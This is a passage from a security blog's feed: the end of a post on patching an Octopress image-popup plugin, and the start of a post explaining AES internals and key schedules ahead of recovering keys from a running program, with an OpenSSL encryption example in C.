15&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;...

&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;div&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;imgpopup screen&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;div&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;caption&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;Click the image for a larger view.&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;div&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;href&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;javascript:void(0)&amp;#39;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;style&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;text-decoration: none&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;image-&amp;lt;%= id %&amp;gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;img&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;src&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&amp;lt;%= scaled_image %&amp;gt;&amp;quot;&lt;/span&gt;
         &lt;span style=&#34;color: #93A1A1&#34;&gt;width&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&amp;lt;%= scaled_width %&amp;gt;&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;height&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&amp;lt;%= scaled_height %&amp;gt;&amp;quot;&lt;/span&gt;
         &lt;span style=&#34;color: #93A1A1&#34;&gt;alt&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;Click me.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;/&amp;gt;&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;a&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;

...

&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;div&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;illustration print&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;img&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;src&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&amp;lt;%= image %&amp;gt;&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;width&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&amp;lt;%= full_width %&amp;gt;&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;height&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&amp;lt;%= full_height %&amp;gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;div&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;I am not quite sure what this &lt;code&gt;erb&lt;/code&gt; file does but it looks like to be a blueprint for the final html content. We can just remove those parts that we want: the caption and the &amp;ldquo;illustration print&amp;rdquo; class.&lt;/p&gt;

&lt;p&gt;Another problem is after we click on the image. There is no space between image title and the &amp;ldquo;close&amp;rdquo; link.&lt;/p&gt;

&lt;p&gt;







&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/popup1/pew2.jpg&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;To fix this we need to modify &lt;code&gt;img_popup.rb&lt;/code&gt; (original at &lt;a href=&#34;https://github.com/ctdk/octopress-image-popup/blob/master/plugins/img_popup.rb&#34; target=&#34;_blank&#34;&gt;https://github.com/ctdk/octopress-image-popup/blob/master/plugins/img_popup.rb&lt;/a&gt;):&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;img_popup.rb&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4
5
6
7
8&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;...
vars = {
  &amp;#39;id&amp;#39;      =&amp;gt; @@id.to_s,
  &amp;#39;image&amp;#39;   =&amp;gt; @path,
  &amp;#39;title&amp;#39;   =&amp;gt; @title
}
 
...
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;We can see &lt;code&gt;title&lt;/code&gt; saved in &lt;code&gt;vars[&#39;title&#39;]&lt;/code&gt;. So we can just add a space to the end of it using the following line:&lt;br /&gt;
&lt;code&gt;vars[&#39;title&#39;] += &amp;quot; &amp;quot;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;And that&amp;rsquo;s it, it works as you can see in this post. Modified code is at: &lt;a href=&#34;https://bitbucket.org/parsiya/octopress-image-popup-forked&#34; target=&#34;_blank&#34;&gt;https://bitbucket.org/parsiya/octopress-image-popup-forked&lt;/a&gt;. I hope I did not mess up the licensing and such :).&lt;/p&gt;

&lt;p&gt;Update August 1, 2015: The tag adds this annoying extra line(s) before the image on the page. I have not had time to look into removing it. To be honest I do not like it that much. I will be using the image caption tag if the image is big enough to not need a pop-up.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Tales from the Crypt(o) - Leaking AES Keys</title>
      <link>http://parsiya.net/blog/2015-01-06-Tales-from-the-Crypto---Leaking-AES-Keys/</link>
      <pubDate>Tue, 06 Jan 2015 23:36:48 +0000</pubDate>
      
      <guid>http://parsiya.net/blog/2015-01-06-Tales-from-the-Crypto---Leaking-AES-Keys/</guid>
      <description>

&lt;p&gt;This post is part one of a two part internal blog entry on creating a Pintool for an assessment. Unfortunately I cannot talk about it, so I decided to put the first part out. If I find an opensource program similar to the assessment I will try and recreate the tool (but I am not holding my breath). As this part is essentially a build up, it may not be coherent at times. Alterntively, if you really want to read it, you can join us. We are almost always hiring (let me do the referal though ;).&lt;/p&gt;

&lt;p&gt;Today we are going to talk about discovering encryption keys in sneaky ways. We will start with simple examples, do a bit of Digital Forensics or DF (for low standards of DF) and finally in part two we will use our recently acquired knowledge of Pintool to do &lt;code&gt;[redacted]&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;First let’s talk a bit about the inner-workings of AES decryption. By inner-workings of AES I do not mean the following diagrams that you have seen so many times.&lt;/p&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/tales1/CBC-Mode-Wikipedia.jpg&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;p&gt;Instead I am going to talk about what happens inside those rectangles labeled “block cipher encryption/decryption.” If you don’t want to know about the AES stuff, jump directly to &lt;a href=&#34;#aeskeysinaction&#34;&gt;2. AES Keys in Action&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&#34;1-thinking-inside-the-box:2cbddf826dbc10ef777e4fb8d0b66a21&#34;&gt;1. Thinking Inside the Box&lt;/h3&gt;

&lt;p&gt;Each of these boxes consist of a few rounds. The number of rounds is based on key size in AES. Keep in mind that AES is a subset of the &lt;em&gt;Rijndael&lt;/em&gt; family of ciphers (and I still do not know how to pronounce the name). NIST (National Institute of Standards and Technology) selected a fixed block size (16 bytes) and three different key sizes (128, 192 and 256 bits) and called it AES (Advanced Encryption Standard) because that’s what NIST does (other than allegedly embedding backdoors in &lt;a href=&#34;https://www.mail-archive.com/openssl-announce@openssl.org/msg00127.html&#34; target=&#34;_blank&#34;&gt;almost never used&lt;/a&gt; random number generators, see &lt;a href=&#34;http://blog.cryptographyengineering.com/2013/09/the-many-flaws-of-dualecdrbg.html&#34; target=&#34;_blank&#34;&gt;DUAL_EC_DRBG&lt;/a&gt; ;)). You do not need to memorize the formula that calculates the number of rounds based on key and block size. You can see the result of my painstaking calculations in the following table:&lt;/p&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;|
| Key Size (bits)  | Number of Rounds (potatoes) |
|------------------|-----------------------------|
|       128        |             10              |
|       192        |             12              |
|       256        |             14              |
|
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;That was easy. So what happens inside each of these rounds. Except the last round, there are four steps in each round (encryption/decryption). For the remainder of this section I am going to assume that we are using a 128-bit key (16 bytes) resulting in 10 rounds.&lt;/p&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/tales1/AES-Rounds.jpg&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;p&gt;There are four different operations but I am going to go into some detail about &lt;code&gt;AddRoundKey&lt;/code&gt;. It is also the only operation which introduces an unknown element (key) into the process. The other operations are also simple and we can probably guess what they do based on their names.&lt;/p&gt;

&lt;h4 id=&#34;1-1-addroundkey:2cbddf826dbc10ef777e4fb8d0b66a21&#34;&gt;1.1 AddRoundKey&lt;/h4&gt;

&lt;p&gt;It’s a simple XOR. A 16 byte round key is XOR-ed with the current block. If we count the number of AddRoundKey operations for Nr==10, we get 11. But we only have one 16 byte key and need 16*11 or 176 bytes. &lt;em&gt;“How am I going to create the extra 160 (176-16) bytes Senpai?”&lt;/em&gt; one may ask. This is done through some magic known as &lt;code&gt;key expansion&lt;/code&gt; which creates bytes out of thin air. It expands the original key into the 176 bytes also known as &lt;code&gt;key schedule&lt;/code&gt;.&lt;/p&gt;

&lt;h5 id=&#34;1-1-1-aes-key-schedule-aka-rijndael-key-schedule:2cbddf826dbc10ef777e4fb8d0b66a21&#34;&gt;1.1.1 AES Key Schedule (aka Rijndael Key Schedule)&lt;/h5&gt;

&lt;p&gt;The key expansion algorithm takes the original key and returns the key schedule. I could talk about the boring details of it but you are already bored and I am lazy. Search for Rijndael Key Schedule if you want to know more. Instead we are going to talk about some interesting stuff.&lt;/p&gt;

&lt;p&gt;Don’t make the convenient mistake of thinking of the key schedule as a Pseudo-Random Number Generator (PRNG) where we enter the original key as the seed and then reap bytes. In a good PRNG, we should not be able to discover the seed by observing the output. In the Rijndael/AES key schedule there is direct correlation between the original key and each round key.&lt;/p&gt;

&lt;p&gt;In AES-128, knowing a single round key (regardless of round number) is enough to generate the original key. In AES-256 we need to know two consecutive round keys and that is a good thing for AES-256. If not, the schedule had reduced the entropy of a 256-bit key to 128 bits. In a lot of hardware (a.k.a limited on-board memory), the first (actual encryption key) and last round keys (first two and last two round keys for AES-256) are stored for encryption/decryption and the rest are generated when needed from them.&lt;/p&gt;

&lt;p&gt;Also by looking at the key schedule, we can see that the original AES key is copied directly to the start of the key schedule. In other words, the first 128 bits (16 bytes) of the AES-128 key schedule are the same as the original key.&lt;/p&gt;

&lt;h5 id=&#34;1-1-2-round-key-usage:2cbddf826dbc10ef777e4fb8d0b66a21&#34;&gt;1.1.2 Round Key Usage&lt;/h5&gt;

&lt;p&gt;Great, so we have 16 bytes that are XOR-ed with something in each round. For decryption, we can create the key schedule and inverse it. This works because XOR is transitive (i.e. If ciphertext = plaintext XOR key then plaintext = ciphertext XOR key).&lt;/p&gt;

&lt;p&gt;Notice the first AddRoundKey block in both encryption and decryption. In encryption this is first 16 bytes of the original key (or the whole key in case of AES-128). In decryption, this is the last round key. Keep this in mind, we are going to use it later.&lt;/p&gt;

&lt;h3 id=&#34;2-a-name-aeskeysinaction-a-aes-keys-in-action:2cbddf826dbc10ef777e4fb8d0b66a21&#34;&gt;2. &lt;a name=&#34;aeskeysinaction&#34;&gt;&lt;/a&gt; AES Keys in Action&lt;/h3&gt;

&lt;p&gt;By now we know how AES keys are used. Let’s do some stuff. We’re going to use the same set up as last time. A Kali 32-bit VM running in VirtualBox.&lt;/p&gt;

&lt;h4 id=&#34;2-1-function-calls:2cbddf826dbc10ef777e4fb8d0b66a21&#34;&gt;2.1 Function Calls&lt;/h4&gt;

&lt;p&gt;External function calls leak information. I am going to divide them into two parts &lt;code&gt;System Calls&lt;/code&gt; (syscalls) and &lt;code&gt;Library Calls&lt;/code&gt;. Basically these are functions that you can call and use in your program. If these functions part of the Operating System they are System Calls and if they are provided by a 3rd party library (shared library, DLL etc) they are Library Calls. For an excellent description of system calls, read the blog post by Gustavo Duartes named [System Calls Make the World Go Round]() (also read the rest of his blog).&lt;/p&gt;

&lt;h5 id=&#34;2-1-1-openssl-example:2cbddf826dbc10ef777e4fb8d0b66a21&#34;&gt;2.1.1 OpenSSL Example&lt;/h5&gt;

&lt;p&gt;Our example will be a simple Encryption/Decryption program in C using OpenSSL modified from [​&lt;a href=&#34;http://wiki.openssl.org/index.php/EVP_Symmetric_Encryption_and_Decryption&#34; target=&#34;_blank&#34;&gt;http://wiki.openssl.org/index.php/EVP_Symmetric_Encryption_and_Decryption&lt;/a&gt;. It will encrypt and decrypt the string “The quick brown fox jumps over the lazy dog” with AES using the 256 bit (32 byte) key &lt;code&gt;ee12c03ceacdfb5d4c0e67c8f5ab3362&lt;/code&gt; and IV &lt;code&gt;d36a4bf2e6dd9c68&lt;/code&gt; (128 bits or 16 bytes). My comments start with &lt;code&gt;///&lt;/code&gt;.&lt;/p&gt;




    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;AES-OpenSSL.cpp&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;  1
  2
  3
  4
  5
  6
  7
  8
  9
 10
 11
 12
 13
 14
 15
 16
 17
 18
 19
 20
 21
 22
 23
 24
 25
 26
 27
 28
 29
 30
 31
 32
 33
 34
 35
 36
 37
 38
 39
 40
 41
 42
 43
 44
 45
 46
 47
 48
 49
 50
 51
 52
 53
 54
 55
 56
 57
 58
 59
 60
 61
 62
 63
 64
 65
 66
 67
 68
 69
 70
 71
 72
 73
 74
 75
 76
 77
 78
 79
 80
 81
 82
 83
 84
 85
 86
 87
 88
 89
 90
 91
 92
 93
 94
 95
 96
 97
 98
 99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #719e07&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color: #586E75&#34;&gt;&amp;lt;openssl/conf.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color: #586E75&#34;&gt;&amp;lt;openssl/evp.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color: #586E75&#34;&gt;&amp;lt;openssl/err.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color: #586E75&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&lt;/span&gt;

&lt;span style=&#34;color: #586E75&#34;&gt;/// Code from OpenSSL Wiki at http://wiki.openssl.org/index.php/EVP_Symmetric_Encryption_and_Decryption&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;/// Needs libssl-dev (e.g. sudo apt-get install libssl-dev )&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;/// Compile with gcc [filename].c -o [outputfile] -lcrypto -ggdb&lt;/span&gt;

&lt;span style=&#34;color: #DC322F&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;handleErrors&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;void&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;ERR_print_errors_fp(stderr);&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;abort();&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #DC322F&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;encrypt&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;plaintext,&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;plaintext_len,&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;key,&lt;/span&gt;
  &lt;span style=&#34;color: #DC322F&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;iv,&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;ciphertext)&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;EVP_CIPHER_CTX&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;ctx;&lt;/span&gt;
  &lt;span style=&#34;color: #DC322F&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;len;&lt;/span&gt;
  &lt;span style=&#34;color: #DC322F&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;ciphertext_len;&lt;/span&gt;

  &lt;span style=&#34;color: #586E75&#34;&gt;/* Create and initialise the context */&lt;/span&gt;
  &lt;span style=&#34;color: #719e07&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(ctx&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;EVP_CIPHER_CTX_new()))&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;handleErrors();&lt;/span&gt;

  &lt;span style=&#34;color: #586E75&#34;&gt;/* Initialise the encryption operation. IMPORTANT - ensure you use a key&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;   * and IV size appropriate for your cipher&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;   * In this example we are using 256 bit AES (i.e. a 256 bit key). The&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;   * IV size for *most* modes is the same as the block size. For AES this&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;   * is 128 bits */&lt;/span&gt;
  &lt;span style=&#34;color: #719e07&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;EVP_EncryptInit_ex(ctx,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;EVP_aes_256_cbc(),&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;NULL&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;key,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;iv))&lt;/span&gt;  &lt;span style=&#34;color: #93A1A1&#34;&gt;handleErrors();&lt;/span&gt;

  &lt;span style=&#34;color: #586E75&#34;&gt;/* Provide the message to be encrypted, and obtain the encrypted output.&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;   * EVP_EncryptUpdate can be called multiple times if necessary&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;   */&lt;/span&gt;
  &lt;span style=&#34;color: #719e07&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;EVP_EncryptUpdate(ctx,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;ciphertext,&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;len,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;plaintext,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;plaintext_len))&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;handleErrors();&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;ciphertext_len&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;len;&lt;/span&gt;

  &lt;span style=&#34;color: #586E75&#34;&gt;/* Finalise the encryption. Further ciphertext bytes may be written at&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;   * this stage.&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;   */&lt;/span&gt;
  &lt;span style=&#34;color: #719e07&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;EVP_EncryptFinal_ex(ctx,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;ciphertext&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;len,&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;len))&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;handleErrors();&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;ciphertext_len&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;len;&lt;/span&gt;

  &lt;span style=&#34;color: #586E75&#34;&gt;/* Clean up */&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;EVP_CIPHER_CTX_free(ctx);&lt;/span&gt;

  &lt;span style=&#34;color: #719e07&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;ciphertext_len;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #DC322F&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;decrypt&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;ciphertext,&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;ciphertext_len,&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;key,&lt;/span&gt;
